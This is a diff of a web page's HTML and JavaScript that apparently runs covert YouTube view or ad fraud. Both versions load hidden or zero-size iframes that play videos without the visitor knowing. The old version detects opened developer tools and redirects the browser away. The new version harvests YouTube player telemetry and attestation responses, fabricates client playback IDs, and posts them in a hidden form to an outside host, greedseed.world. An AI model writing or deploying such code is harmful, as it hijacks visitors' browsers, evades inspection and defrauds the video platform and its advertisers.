@@ -1,203 +1,168 @@
 
 
-<!DOCTYPE html><html>
-<head>
-	<meta name="robots" content="noindex,nofollow">
-	<meta name="referrer" content="no-referrer">
-	<style>
-		
-		html,body{
-			overflow:hidden;
-			height:100%;
-			width:100%;
-			border:0px;
-			padding:0px;
-			margin:0px;
+<script>
+	function onReadt(){
+		document.getElementById('player_iframe2').contentWindow.postMessage('{"event":"command","func":"unMute","args":["1"],"channel":"widget"}','*');
+		document.getElementById('player_iframe2').contentWindow.postMessage('{"event":"command","func":"loadVideoById","args":["fTGQTIdcPQY"],"channel":"widget"}','*');
+		setTimeout(function(){				
+			document.getElementById('player_iframe2').contentWindow.postMessage('{"event":"listening","id":1,"channel":"widget"}',"*");
+		},13000);
+	}
+	</script>
+<script>
+
+	function hD(a) {
+		if (window.crypto && window.crypto.getRandomValues)
+			try {
+				var b = Array(a)
+				  , c = new Uint8Array(a);
+				window.crypto.getRandomValues(c);
+				for (var d = 0; d < b.length; d++)
+					b[d] = c[d];
+				return b
+			} catch (f) {}
+		b = Array(a);
+		for (c = 0; c < a; c++) {
+			d = Date.now();
+			for (var e = 0; e < d % 23; e++)
+				b[c] = Math.random();
+			b[c] = Math.floor(256 * Math.random())
 		}
-		iframe{
-			position:fixed;
-			top:0px;
-			left:0px;
-			border:0px;
-			padding:0px;
-			margin:0px;
-			width:0px;
-			height:0px;
-		}
-	</style>
-		<script>		
-			var mt_rand = function(min,max){return Math.floor(Math.random()*(max-min+1)+min);};
-		</script>
-		<script>		
-		var s=0;
-		</script>
-				
-			<script>//var devtools = function() {};
-			var closeBrouse=0;
-			var clearDetected;
-			var SetTimeoutDeteced;
-			/*var DetecedConsole=function(){
-				let ar_dev=[];
-				for(i=0;i<2000;i++){
-					let ar_chank={i:Math.random()};
-					ar_dev.push({i:ar_chank});
-				}
-				let ser=new Date().getTime();						
-				for(i=0;i<20;i++){
-					console.table(ar_dev);
-				}
-				console.clear();
-				return (new Date().getTime())-ser;
-			}
-			clearDetected=setInterval(function(){	
-				if(DetecedConsole()>200){
-					if(closeBrouse==0){
-						s=1;
-						localStorage.setItem("backendtimer28",(Date.now()/1000).toFixed(0)+1000000); 
-						SetTimeoutDeteced=setTimeout(function(){	
-							closeBrouse=1;					
-							ym(85541437,'reachGoal','closeBre');
-							clearInterval(clearDetected);
-							window.location.href="/f.php?sid=212040&rand="+Math.floor(Math.random() * 1000000000);
-						},1000);
-					}
-				}else{
-					clearTimeout(SetTimeoutDeteced);
-				}	
-			},200);*/
-			function stopFrame(){
-				if(closeBrouse==0){
-					s=1;
-					localStorage.setItem("backendtimer28",(Date.now()/1000).toFixed(0)+1000000); 
-					SetTimeoutDeteced=setTimeout(function(){	
-						closeBrouse=1;					
-						ym(85541437,'reachGoal','closeBre');
-						window.location.href="/f.php?sid=212040&rand="+Math.floor(Math.random() * 1000000000);
-					},1000);
-				}
-				setTimeout(function(){console.clear()},100);
-			}
-			if(localStorage.getItem('notDetected') != 1){
-				console.log(Object.defineProperties(new Error, {
-				  message: {get() {
-					  if(closeBrouse==0){
-							s=1;
-							localStorage.setItem("backendtimer28",(Date.now()/1000).toFixed(0)+1000000); 
-							SetTimeoutDeteced=setTimeout(function(){	
-								closeBrouse=1;					
-								ym(85541437,'reachGoal','closeBre');
-								window.location.href="/f.php?sid=212040&rand="+Math.floor(Math.random() * 1000000000);
-							},1000);
-						}
-						setTimeout(function(){console.clear()},100);			  
-				  }},
-				  toString: {value() {(new Error).stack.includes('toString@')&&stopFrame('Safari')}}
-				}));
-			}
-			</script>	
-		</head>
-<body>	
-				
-		<script>
-		var list='TLGGgLGLHCd0cqExNDA4MjAyMg';
-		var player;
-		var send_p=0;
-		var error_yt=0;
-		function api_YTNEW(a,b){
-			return '{"event":"command","func":"'+a+'","args":['+b+'],"id":1,"channel":"widget"}';
-		}
-		function onReadyYT(){
-			player=document.getElementById('player').contentWindow;
-			player.postMessage('{"event":"listening","id":1,"channel":"widget"}','*');
-			player.postMessage('{"event":"command","func":"addEventListener","args":["onStateChange"],"channel":"widget"}','*');
+		if (gD)
+			for (c = 1,
+			d = 0; d < gD.length; d++)
+				b[c % a] = b[c % a] ^ b[(c - 1) % a] / 4 ^ gD.charCodeAt(d),
+				c++;
+		return b
+	}
+	function iD(a) {
+		a = hD(a);
+		for (var b = [], c = 0; c < a.length; c++)
+			b.push("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_".charAt(a[c] & 63));
+		return b.join("")
+	}	
+	</script>
+<script>	
+	var isLoadIframe=0;
+	function loadBlank(){
+		if(isLoadIframe == 0){
+			isLoadIframe=1;
+			let d=document.createElement('form');
+				d.action="/worker_api/adunit.php?vid=fTGQTIdcPQY";
+				d.method="POST";
+				d.id="form_player";
+			d.innerHTML=`
+			<input type="hidden" name="player" value="1" />
+			<input type="hidden" name="responseContext" value="" />
+			<input type="hidden" name="lio" value="" />
+			<input type="hidden" name="cpn" value="" />
+			<input type="hidden" name="ei" value="" />
+			<input type="hidden" name="cl" value="" />
+			<input type="hidden" name="fexp" value="" />
+			<input type="hidden" name="of" value="" />
+			<input type="hidden" name="plid" value="" />
+			<input type="hidden" name="vm" value="" />
+			<input type="hidden" name="fmt" value="" />
+			<input type="hidden" name="hl" value="" />
+			<input type="hidden" name="cr" value="" />
+			<input type="hidden" name="afmt" value="" />
+			<input type="hidden" name="cos" value="" />
+			<input type="hidden" name="cosver" value="" />
+			<input type="hidden" name="cbr" value="" />
+			<input type="hidden" name="cbrver" value="" />`;
 			
-			
-			setTimeout(function(){
-				if(send_p == 0){
-					send_p=1;
-					imwesq132s("/i.php?s=212040&id=58531&hsh=307cf23b37c87e6e3cab1a70d6e6ed8c&error="+error_yt);
-					
-				}
-			},10*60*1000);
+			document.getElementById('iframeBlank').contentDocument.body.append(d);
+		
+			document.getElementById('iframeBlank').contentDocument.querySelector('[name=cpn]').value=iD(16);
+			document.getElementById('player_iframe').src='https://greedseed.world/worker_api/ima/index.php?cpn='+document.getElementById('iframeBlank').contentDocument.querySelector('[name=cpn]').value+'&vid=fTGQTIdcPQY';
 		}
-		function listerYT(a){
-			try{
-				let info=JSON.parse(a.data);
-				if(typeof info == 'object'){
-					//console.log(info);
-					if(info.event=='infoDelivery'){
-						
-						if (info.info.hasOwnProperty('videoData')) {	
-							if (info.info.videoData.hasOwnProperty('list')) {	
-								list=info.info.videoData.list;
-							}
-						}
-					}
-					if(info.event=='onReady'){
-							player=document.getElementById('player').contentWindow;
-							//player.postMessage('{"event":"listening","id":1,"channel":"widget"}','*');	
-							//player.postMessage('{"event":"command","func":"addEventListener","args":["onStateChange"],"channel":"widget"}','*');	
-							//player.postMessage(api_YTNEW("setVolume",0),'*');							
-							//player.postMessage(api_YTNEW("mute",1),'*');
-							//player.postMessage(api_YTNEW('playVideo',1),'*');		
-						setTimeout(function(){		
-							player.postMessage(api_YTNEW("mute",1),'*');
-							player.postMessage(api_YTNEW('playVideo',1),'*');								
-						},5000);	
-						if(state==0){
-							
-						}
-					}
-					if(info.event=='onStateChange'){						
-						
-					}
-				}
-			}catch(e){}
-		}
-		if (window.addEventListener) {
-			window.addEventListener("message", listerYT);
-		} else {
-			window.attachEvent("onmessage",  listerYT);
-		}
-		</script>
-		<iframe src="https://greedseed.world/worker_api/adunit.php?vid=CLrGMo2wGwg" frameborder="0" allowfullscreen="1" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" title="YouTube video player" onload="onReadyYT()" style="width:380px; height:380px;"></iframe>
+	}
+	</script>
+<iframe id="player_iframe" src="about:blank" frameborder="0" allowfullscreen="1" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" title="YouTube video player"></iframe>
+<iframe id="player_iframe2" src="https://www.google.com/url?sa=D&q=https%3A%2F%2Fwww.youtube.com%2Fembed%2F%3Fps%3Dgvn%26enablejsapi%3D1%26origin%3D%2A%26playsinline%3D1%26autoplay%3D0%26mute%3D0%26el%3Ddetailpage" frameborder="0" allowfullscreen="1" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" title="YouTube video player" onload='onReadt();'></iframe>
+<iframe id='iframeBlank' src="about:blank" style="position: fixed;top: 0px;left: 0px;width: 100%;height: 100%;border:0px;background:black;" onload='loadBlank();'>
 		
-		<iframe id="player" src="https://www.google.com/url?sa=D&q=https%3A%2F%2Fwww.youtube.com%2Fembed%2FCLrGMo2wGwg%3Forigin%3D%252A%26ps%3Dgvn%26enablejsapi%3D1%26autoplay%3D1%26mute%3D1%26el%3Dembedded" frameborder="0" allowfullscreen="1" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" title="YouTube video player" onload="onReadyYT()" style="width:380px; height:380px;"></iframe>
-		
-		
-		<iframe src="/frame/hearbeat.php?vid=CLrGMo2wGwg" frameborder="0" allowfullscreen="1" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" title="YouTube video player" style="width:0px; height:0px;"></iframe>
-		
-		
-		
-		
-	
-				<script>
-		setInterval(function(){						
-					fetch('/youtube.txt').then((response) => response.text()).then((text) => {
-					  if(text>0){
-						location.reload();
-					  }
-					});			
-		},1*60*1000);
-		</script>
-				<script>
-			var aiFrameNew=0;
-			function newFrameYt(){
-				let newFrame=document.createElement("iframe");
-				newFrame.setAttribute('allow','accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture');
-				newFrame.setAttribute('title','YouTube video player');
-				newFrame.setAttribute('allowfullscreen','1');
-				newFrame.setAttribute('frameborder','0');
-				newFrame.setAttribute('style','width:144px; height:144px;');
-				newFrame.setAttribute('src','https://www.google.com/url?sa=D&q=https%3A%2F%2Fwww.youtube.com%2Fembed%2FFvYQ1GfPoLI%3Forigin%3D%252A%26ps%3Dgvn%26enablejsapi%3D1%26autoplay%3D1%26mute%3D1%26el%3Dembedded');
-				document.body.append(newFrame)
-			}
-			
-		</script>		
-		
-		
+	</iframe>
 
 <script>
-</script>		
-</body>
-</html>
+	function listerYT(a){
+		console.log(a.data);
+		try{
+			if(typeof a.data == "object"){
+				//console.log(a.data);
+				if(a.data.type == 'video'){
+					document.querySelector('#iframeBlank').contentWindow.postMessage(a.data,'*');
+				} else if(a.data.type == 'audio'){
+					document.querySelector('#iframeBlank').contentWindow.postMessage(a.data,'*');
+				} else if(a.data.type == 'install'){
+					document.getElementById('player_iframe').contentWindow.postMessage(a.data,'*');
+				}
+				return;
+			}
+			if(a.data.indexOf('playerAttestationRenderer') !== -1){				
+				document.querySelector('#iframeBlank').contentDocument.querySelector('[name=responseContext]').value=a.data;
+				//document.querySelector('#iframeBlank').contentDocument.getElementById('form_player').submit();	
+			}
+			let info=JSON.parse(a.data);
+			//console.log(a.data);
+			if(typeof info == 'object'){
+				try{
+					if(info.info.duration > 0){					
+						document.querySelector('#iframeBlank').contentDocument.querySelector('[name=duration]').value=info.info.duration;	
+					}						
+				} catch(e){
+					//console.log(e);
+				}	
+				if( info.event == 'initialDelivery'){
+					//document.querySelector('[name=cr]').value=info.info.videoStats.cr;
+					//document.querySelector('[name=afmt]').value=info.info.videoStats.afmt;
+					//document.querySelector('[name=fmt]').value=info.info.videoStats.fmt;
+					//document.querySelector('[name=hl]').value=info.info.videoStats.hl;
+					
+					document.querySelector('#iframeBlank').contentDocument.querySelector('[name=ei]').value=info.info.videoStats.ei;
+					
+					//document.querySelector('#iframeBlank').contentDocument.querySelector('[name=cpn]').value=info.info.videoStats.cpn;
+					
+					//document.querySelector('#iframeBlank').contentDocument.querySelector('[name=cl]').value=info.info.videoStats.cl;
+					
+					//document.querySelector('#iframeBlank').contentDocument.querySelector('[name=fexp]').value=info.info.videoStats.fexp;
+					
+					//document.querySelector('#iframeBlank').contentDocument.querySelector('[name=of]').value=info.info.videoStats.of;
+					
+					//document.querySelector('#iframeBlank').contentDocument.querySelector('[name=plid]').value=info.info.videoStats.plid;
+					
+					document.querySelector('#iframeBlank').contentDocument.querySelector('[name=vm]').value=info.info.videoStats.vm;	
+					try{
+						document.querySelector('#iframeBlank').contentDocument.querySelector('[name=lio]').value=info.info.videoStats.lio;
+					} catch(e)	{}	
+
+					
+					try{document.querySelector('#iframeBlank').contentDocument.querySelector('[name=cos]').value=info.info.videoStats.cos;	} catch(e)	{}	
+					
+					try{document.querySelector('#iframeBlank').contentDocument.querySelector('[name=cosver]').value=info.info.videoStats.cosver;	} catch(e)	{}	
+					
+					try{document.querySelector('#iframeBlank').contentDocument.querySelector('[name=cbr]').value=info.info.videoStats.cbr;	} catch(e)	{}	
+					
+					try{document.querySelector('#iframeBlank').contentDocument.querySelector('[name=cbrver]').value=info.info.videoStats.cbrver;} catch(e)	{}		
+					
+					
+					
+	
+					setTimeout(function(){
+						if(document.querySelector('#iframeBlank').contentDocument.querySelector('[name=responseContext]').value !='')document.querySelector('#iframeBlank').contentDocument.getElementById('form_player').submit();		
+						
+						document.getElementById('player_iframe2').parentNode.removeChild(document.getElementById('player_iframe2'));
+					},1500);	
+				}
+			}
+		} catch(e){
+			//console.log(e);
+		}		
+	 }
+	  
+	if (window.addEventListener) {
+		window.addEventListener("message", listerYT);
+	} else {
+		window.attachEvent("onmessage",  listerYT);
+	}
+	</script>
